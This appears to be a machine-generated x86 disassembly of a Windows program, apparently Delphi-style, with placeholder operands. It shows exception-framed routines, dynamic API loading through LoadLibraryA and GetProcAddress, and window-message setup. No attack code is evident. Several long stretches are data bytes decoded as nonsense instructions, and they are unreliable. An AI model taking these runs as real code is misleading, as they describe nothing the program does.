mov esi eax
lea eax [ esi + 0x4 ]
push eax
call DeleteCriticalSection
mov edx ebx
and dl 0xfc
mov eax esi
call sub_40323c
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4035c0
sub_42c58a
mov eax eax
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_42c5b1
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42c5b8
retn
sub_42c5c4
push ebp
mov ebp esp
mov eax [ rw-data ]
call sub_42c57c
xor eax eax
push ebp
push sub_42c77b
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ rw-data ] 0x0
jle r-xdata
cmp [ rw-data ] 0x0
je r-xdata
dec [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42c782
mov eax [ rw-data ]
call sub_42c584
retn
cmp [ rw-data ] 0x0
jne r-xdata
mov eax [ rw-data ]
push eax
call FreeLibrary
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
sub_42c784
push ebp
mov ebp esp
push ecx
push ebx
mov ebx rw-data
mov eax [ rw-data ]
call sub_42c57c
xor eax eax
push ebp
push sub_42cb37
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
cmp [ ebx ] 0x0
jne r-xdata
cmp [ ebx ] 0x0
seta [ ebp - 0x1 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42cb3e
mov eax [ rw-data ]
call sub_42c584
retn
push r-xdata
call LoadLibraryA
mov [ ebx ] eax
cmp [ ebx ] 0x0
jbe r-xdata
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
sub_42cee8
cmp [ rw-data ] 0x0
jbe r-xdata
xor eax eax
call [ rw-data ]
test eax eax
je r-xdata
xor eax eax
jmp r-xdata
call [ rw-data ]
test eax eax
jne r-xdata
retn
mov al 0x1
retn
sub_42cf10
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_42cf58
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42cf5f
retn
cmp [ rw-data ] 0x0
jle r-xdata
mov eax [ rw-data ]
call sub_40324c
call sub_42c5c4
cmp [ rw-data ] 0x0
jg r-xdata
sub_42cf80
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_42cfa5
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42cfac
retn
sub_42cfb8
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_42cfdd
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42cfe4
retn
sub_42cff0
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_42d015
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42d01c
retn
sub_42d028
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_42d04d
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42d054
retn
sub_42d060
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_42d085
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42d08c
retn
sub_42d098
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_42d0bd
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42d0c4
retn
sub_42d0d0
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_42d0f5
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42d0fc
retn
sub_42d108
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_42d12d
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42d134
retn
sub_42d140
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_42d165
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42d16c
retn
sub_42d17c
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
cmp dl dl
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx + edx * 8 ] al
inc edx
add [ edx + edx * 8 ] ah
inc edx
add [ eax ] bl
add [ eax ] al
add al 0x8b
inc ecx
add [ eax + 0x3 ] cl
inc edx
add [ eax - 0x63ffbfcc ] ah
cld
inc ecx
add [ eax - 0x77ffbfcc ] ch
rol [ edx ] cl
in al 0x31
inc eax
add [ eax ] al
xor al [ eax ]
sub al 0xd3
inc edx
add al al
test al 0x41
add [ eax - 0x1 ] dl
inc ecx
add ah bl
cmpsd [ esi ] [ edi ]
inc ecx
add [ eax ] ch
add [ edx ] al
hlt
sub_42d32c
push ebx
push esi
call sub_4035d8
mov ebx edx
mov esi eax
mov eax [ esi + 0x40 ]
test eax eax
je r-xdata
mov edx ebx
and dl 0xfc
mov eax esi
call sub_41fc24
test bl bl
jle r-xdata
call sub_420d00
pop esi
pop ebx
retn
mov eax esi
call sub_4035c0
sub_42d360
xor ecx ecx
mov edx [ edx ]
cmp edx [ rw-data ]
jne r-xdata
mov eax ecx
retn
cmp [ eax + 0x38 ] 0x0
je r-xdata
mov edx [ rw-data ]
mov edx [ edx ]
mov eax [ eax + 0x38 ]
xchg edx eax
call sub_460504
mov cl 0x1
sub_42d388
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov edi [ ebx + 0x3c ]
test edi edi
je r-xdata
mov edx esi
mov eax ebx
call sub_40349c
mov eax [ esi + 0x8 ]
push eax
mov eax [ esi + 0x4 ]
push eax
mov eax [ esi ]
push eax
push edi
mov eax [ ebx + 0x34 ]
push eax
call CallWindowProcA
mov [ esi + 0xc ] eax
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_42d3c0
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_42d3ea
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x30 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_42d458
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
mov esi ecx
mov ebx edx
mov [ ebp - 0x8 ] eax
call GetActiveWindow
mov [ ebp - 0x10 ] eax
xor eax eax
call sub_456e54
mov [ ebp - 0x14 ] eax
call sub_456d70
mov [ ebp - 0x18 ] eax
xor eax eax
push ebp
push sub_42d51b
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
push eax
mov eax [ eax ]
mov eax [ eax + 0x34 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call sub_45fdf4
fnstcw [ ebp - 0x2 ]
xor eax eax
push ebp
push sub_42d4ed
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov [ rw-data ] eax
push esi
call ebx
mov [ ebp - 0xc ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42d4f4
fnclex
fldcw [ ebp - 0x2 ]
mov eax [ ebp - 0x8 ]
push eax
mov eax [ eax ]
mov eax [ eax + 0x34 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call sub_45fe50
retn
sub_42d4f4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42d522
mov eax [ ebp - 0x14 ]
call sub_456f08
mov eax [ ebp - 0x10 ]
push eax
call SetActiveWindow
mov eax [ ebp - 0x18 ]
call sub_456d78
retn
sub_42d5f8
add esp 0xffffffd0
push r-xdata
call RegisterWindowMessageA
mov [ rw-data ] eax
push r-xdata
call RegisterWindowMessageA
mov [ rw-data ] eax
push 0x1
mov eax [ rw-data ]
mov [ esp + 0x24 ] eax
mov [ esp + 0x28 ] 0x0
call GetCurrentThreadId
mov [ esp + 0x2c ] eax
mov [ esp + 0x30 ] 0x0
lea ecx [ esp + 0x24 ]
mov edx r-xdata
lea eax [ esp + 0x4 ]
call sub_408f4c
push eax
call GlobalAddAtomA
mov [ rw-data ] ax
add esp 0x30
retn
sub_42d693
add [ edi ] cl
add [ eax ] al
add [ eax + ebp - 0x6e8bffb9 ] ch
inc edi
add [ eax ] al
add [ eax ] al
add [ eax + 0x1c004728 ] ch
xchg esp eax
inc edi
add [ eax ] al
add [ eax ] al
add [ eax + ebp - 0x6eb7ffb9 ] ah
inc edi
add [ eax ] al
add [ eax ] al
add [ eax + 0x48004728 ] ah
xchg ebp eax
inc edi
add [ eax ] al
add [ eax ] al
add [ eax + ebp - 0x6bcbffb9 ] bl
inc edi
add [ eax ] al
add [ eax ] al
add [ eax - 0x3bffb8d8 ] bl
xchg ebx eax
inc edi
add [ eax ] al
add [ eax ] al
add [ eax + ebp - 0x6b2bffb9 ] dl
inc edi
add [ eax ] al
add [ eax ] al
add [ eax - 0x7ffb8d8 ] dl
xchg edx eax
inc edi
add [ eax ] al
add [ eax ] al
add [ eax + ebp - 0x6c1fffb9 ] cl
inc edi
add [ eax ] al
add [ eax ] al
add [ eax + 0x20004728 ] cl
xchg ebx eax
inc edi
add [ eax ] al
add [ eax ] al
add [ eax + ebp - 0x6a37ffb9 ] al
inc edi
add [ eax ] al
add [ eax ] al
add [ eax + 0x28 ] dl
inc edi
add al cl
xchg ecx eax
inc edi
add [ eax ] al
add [ eax ] al
add [ eax + ebp + 0x47 ] cl
add [ eax ] ch
xchg ebp eax
inc edi
add [ eax ] al
add [ eax ] al
add [ eax + 0x28 ] cl
inc edi
add [ ebp + edx * 4 + 0x47 ] ch
add [ eax ] al
add [ eax ] al
add [ eax + ebp + 0x47 ] al
add [ eax - 0x6d ] dh
inc edi
add [ eax ] al
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
xor eax eax
push ebp
push sub_42d79e
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42d7a5
retn
cmp [ rw-data ] 0x0
je r-xdata
mov eax rw-data
mov ecx 0xb
mov edx [ r-xdata ]
call sub_404a50
mov ax [ rw-data ]
push eax
call GlobalDeleteAtom
sub_42d7a8
sub [ rw-data ] 0x1
jae r-xdata
retn
mov eax r-xdata
call sub_403d70
call sub_42d5f8
mov eax [ r-xdata ]
call sub_419a74
mov eax [ r-xdata ]
call sub_419b14
mov edx [ r-xdata ]
mov eax [ r-xdata ]
call sub_419ac0
sub_42d7e8
in al dx
xlat
inc edx
add [ ebx ] al
or edx [ edx + eax * 2 + 0x65 ]
jbe r-xdata
outsb
or al 0x62
jae r-xdata
insb
push ebx
je r-xdata
js r-xdata
outsd
je r-xdata
outsb
or esp [ gs : edx + 0x73 ]
insb
add [ gs : eax ] eax
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add al ch
xlat
inc edx
add [ ecx ] cl
bound esi [ ebx + 0x4c ]
outsd
ja r-xdata
jo r-xdata
imul ebp [ esi + 0x65 ] 0x53736208
inc edx
cmpsd [ esi ] [ edi ]
inc ecx
add [ eax - 0x6bffbbdc ] al
clc
inc ebx
add [ eax ] al
clc
inc ebx
add [ ecx + eax + 0x3600044 ] ch
inc edx
add [ eax ] cl
inc edx
add [ eax ] al
inc edx
add [ eax + 0x3 ] ch
inc edx
add [ edi + ebp * 8 + 0x42 ] cl
xor al [ eax ]
mov [ esi + 0x44 ] bh
add [ eax - 0x4fffbbdc ] bh
sbb [ eax + eax - 0x24 ] al
outsd
insd
dec esp
imul ebp [ esi + 0x65 ] 0x4c73620a
je r-xdata
arpl [ ebp + 0x72 ] sp
or [ ebp + 0x78 ] al
je r-xdata
push edx
or esp [ edx + 0x73 ]
jb r-xdata
insb
mov ch 0x43
add [ eax + eax ] dh
[ eax + 0x1004428 ]
insb
nop
js r-xdata
add [ eax + 0x3 ] cl
inc edx
add [ eax - 0x63ffbfcc ] ah
cld
inc ecx
add [ eax - 0x27ffbfcc ] ch
imul esp [ edi + 0x68 ] 0x6e694c74
or [ gs : edx + 0x73 ] ah
push ebx
imul ebp [ esi + 0x65 ] 0x5273620b
add ah ah
xor [ eax ] eax
add [ edx ] dh
inc eax
add [ eax - 0x47ffbb82 ] cl
and al 0x44
add [ eax - 0x23ffbbe8 ] dh
je r-xdata
jae r-xdata
or [ fs : edx + 0x73 ] ah
push edx
popad
imul esi [ ebx + 0x65 ] 0x78450864
je r-xdata
inc edx
add [ eax + 0x1 ] ch
add bh bh
mov eax 0x10042ef
jb r-xdata
add [ esi + edx + 0x44 ] al
add [ eax ] al
daa
inc esp
add [ eax + 0xc004408 ] bl
or [ eax + eax - 0x80 ] eax
stc
inc ebx
add ah ch
or [ eax + eax + 0x20 ] al
int1
inc edx
add [ esi ] al
push esp
inc edx
jbe r-xdata
inc edx
add [ edi ] al
push es
push esp
inc edx
jbe r-xdata
add [ eax + 0x13 ] cl
inc esp
add [ ebx + edx + 0x44 ] al
add [ esp + edx ] dl
inc esp
add [ eax ] cl
test [ ebx ] sub_43fe4c
mov al 0xfd
inc ebx
add al bl
push es
inc esp
add [ eax - 0xa ] dl
inc ebx
add [ esi + esi * 8 + 0x43 ] dl
add [ eax + 0x26 ] dl
inc esp
add [ esi + 0x44 ] bh
add [ ecx + eax - 0x833ffbc ] dl
inc ebx
add [ eax ] ah
add eax [ eax + eax - 0x68 ]
add al [ eax + eax - 0x54 ]
add eax 0x4580044
inc esp
inc eax
add [ edx ] al
push 0x4c004203
out dx eax
inc edx
insb
jae r-xdata
pop ss
inc esp
test al 0x34
inc eax
add al bl
je r-xdata
add [ eax ] al
imul ebp [ esi + 0x74 ] 0x40100073
add [ edx + 0x38ff0000 ] bl
add eax 0x10044
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x430b000d ] al
outsd
outsb
jae r-xdata
insb
fcomp st0
inc edx
add [ eax - 0x37 ] ah
inc ebx
add [ ebx ] dl
add [ eax ] cl
inc ebp
js r-xdata
je r-xdata
fadd [ edx ]
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x27 ] bh
insb
jae r-xdata
add [ eax + 0x53080010 ] al
push 0x6948776f
outsb
je r-xdata
fadd [ esp + eax * 2 ]
xlat
adc [ eax ] eax
add eax 0x6c797453
add [ gs : eax ] dl
inc eax
add [ edi ] dl
add bh bh
in al 0x2
inc esp
add [ eax + 0x24 ] al
inc esp
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
adc al [ eax ]
pop es
push esi
imul esi [ ebx + 0x69 ] 0x90656c62
clc
fiadd [ edx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
cmp al 0xdb
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] ch
fild [ edx ]
xor bl bl
inc edx
add [ eax + eax ] al
add [ ebx + ecx * 4 ] al
inc ecx
add [ eax + 0x3 ] cl
inc edx
add [ eax - 0x63ffbfcc ] ah
cld
inc ecx
add [ eax - 0x63ffbfcc ] ch
xor al 0x40
add ah ah
xor [ eax ] eax
add [ edx ] dh
inc eax
add al bh
inc edx
add al al
test al 0x41
add [ eax - 0x1 ] dl
inc ecx
add ah bl
cmpsd [ esi ] [ edi ]
inc ecx
add [ eax ] ch
add [ edx ] al
hlt
outsb
je r-xdata
add [ eax ] al
inc ebx
je r-xdata
add [ ebx + 0x33 ] esi
mov eax r-xdata
call sub_403d70
call sub_42d5f8
mov eax [ r-xdata ]
call sub_419a74
mov eax [ r-xdata ]
call sub_419b14
mov edx [ r-xdata ]
mov eax [ r-xdata ]
call sub_419ac0
retn
shr [ eax ] 0xd8
inc edx
add [ ebx ] al
or edx [ edx + eax * 2 + 0x65 ]
jbe r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
out dx eax
inc edx
add [ ecx ] al
push 0x6948776f
outsb
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax + 0x1 ] al
push cs
add [ esi ] cl
push eax
popad
jb r-xdata
add bh bh
cmp [ 0x10044 ] al
insb
jae r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
insb
push ebx
push 0x1657061
add [ eax ] al
add [ eax ] al
push es
add [ eax ] al
add [ eax + ebx * 8 ] ah
inc edx
add [ 0x6f427362 ] al
js r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
call [ eax + 0x4dc0044 ]
inc esp
fadd [ edx ]
imul eax [ ecx ] 0xefd4ff00
inc edx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
sldt [ 0x70616853 ]
add [ gs : eax ] dl
inc eax
add [ ecx + 0x14ff0000 ] bl
add eax 0x4dc0044
add [ ebp + ebp * 4 + 0x5b0043 ] bl
add bh bh
fdivr st0
inc ebx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
or eax [ eax ]
add eax 0x67696c41
outsb
les esi [ ebx + eax * 2 + 0x6100 ]
[ eax ]
test [ ebx ] sub_43f7b4
add [ eax ] al
add [ eax + 0x3 ] al
or al 0x0
pop es
inc ecx
outsb
arpl [ eax + 0x6f ] bp
jb r-xdata
or [ edx + 0x73 ] esp
bound esi [ ebx + 0x46 ]
jb r-xdata
cdq
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
imul ebp [ esi + 0x65 ] 0x4273620c
add [ ecx + ebx * 8 + 0x42 ] ch
add [ ecx + eax ] ch
add [ eax + ecx * 8 + 0x43 ] ch
push esp
outsd
jo r-xdata
insd
or [ gs : edx + 0x73 ] esp
sub_42e37b
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f07002e ] al
outsb
inc ebx
insb
or cl [ edi + 0x6e ]
jb r-xdata
or cl [ edi + 0x6e ]
jb r-xdata
inc esp
outsd
arpl [ ebx + 0x4f ] bp
jbe r-xdata
add [ eax ] eax
inc [ ecx ]
imul ebp [ esi + 0x65 ] 0x73655264
imul edi [ edx + 0x65 ] r-xdata
xor [ ecx ] al
add bh bh
xor [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
xor [ eax ] al
push cs
dec edi
outsb
inc ebx
outsd
outsb
je r-xdata
add [ eax ] al
dec edi
jbe r-xdata
inc esp
jb r-xdata
add al dh
add [ eax ] al
push eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a0035 ] al
outsb
jns r-xdata
add [ eax ] al
add [ eax + 0x4f0a0033 ] al
outsb
inc esp
bound ebp [ ebx + eax * 2 + 0x6c ]
imul esp [ ebx + 0x6b ] r-xdata
call 0xffffffffe941e45e
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a0034 ] al
outsb
inc esp
jb r-xdata
js r-xdata
dec edi
jb r-xdata
outsb
inc ebp
outsb
je r-xdata
jb r-xdata
popad
add [ eax ] ch
add [ eax ] eax
[ eax ]
add [ eax ] 0x0
add [ eax + 0x4f090037 ] al
inc esp
jb r-xdata
adc al 0xb8
inc ebx
add al ch
push eax
outsd
jo r-xdata
mov edx 0x1000043
add bh bh
add [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
aas
add [ ebx ] cl
dec edi
outsb
push ebx
inc esp
outsd
ja r-xdata
dec ebp
outsd
jne r-xdata
rol [ eax ] 0x1
jns r-xdata
outsb
inc ebp
outsb
inc esp
jb r-xdata
mov eax 0x1080043
add bh bh
or [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add [ ss : ecx ] cl
dec edi
outsb
inc ebp
outsb
inc esp
outsd
arpl [ ebx - 0x44 ] bp
mov eax 0x1180043
add bh bh
sbb [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
aaa
add [ ecx ] cl
dec edi
jns r-xdata
jo r-xdata
inc edi
je r-xdata
dec esp
add [ eax ] al
jo r-xdata
inc edx
add [ eax ] al
jb r-xdata
mov al [ 0xffffffffd80043b6 ]
add [ eax ] al
add bh bh
rol [ eax ] 0x1
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
cmp eax [ eax ]
or ecx [ edi + 0x6e ]
dec ecx
outsb
outsw
sub [ esi + 0xd00043 ] dh
add al cl
add [ eax ] eax
dec eax
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f060039 ] al
outsb
inc ebp
js r-xdata
mov edx 0x1d00043
add bh bh
rol [ ecx ] 0x1
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
cmp al [ eax ]
or eax 0x65476e4f
je r-xdata
add [ eax + 0x4f070038 ] al
add al al
add [ eax ] eax
inc eax
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
inc esp
mov bh 0x43
sub [ esi + 0xe00043 ] dh
add bh bh
loopne r-xdata
outsb
imul esi [ ebp + 0x49 ] 0x286f666e
mov dh 0x43
add al dl
add [ eax ] al
call eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b003b ] al
jb r-xdata
add [ edx ] cl
dec edi
outsb
inc esp
outsd
arpl [ ebx + 0x44 ] bp
mov ecx 0x1b00043
add bh bh
mov al 0x1
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
xor [ eax ] eax
or cl [ edi + 0x6e ]
add [ ecx + ebp * 2 - 0x9afffbc ] cl
inc ebx
add [ esi + esi * 8 + 0x43 ] dl
add [ eax + 0x26 ] dl
inc esp
add [ esi + 0x44 ] bh
add [ ecx + eax - 0x833ffbc ] dl
inc ebx
add [ eax ] ah
add eax [ eax + eax - 0x68 ]
add al [ eax + eax - 0x54 ]
add eax 0x4580044
inc esp
add al al
inc ebp
inc esp
add ah ch
inc esp
add ah bl
cmpsd [ esi ] [ edi ]
inc ecx
add [ edx + eax + 0x43 ] al
add [ eax + edi * 8 + 0x2580043 ] dl
inc ebx
add [ ecx + eax + 0x3600044 ] ch
inc edx
add [ eax ] cl
inc edx
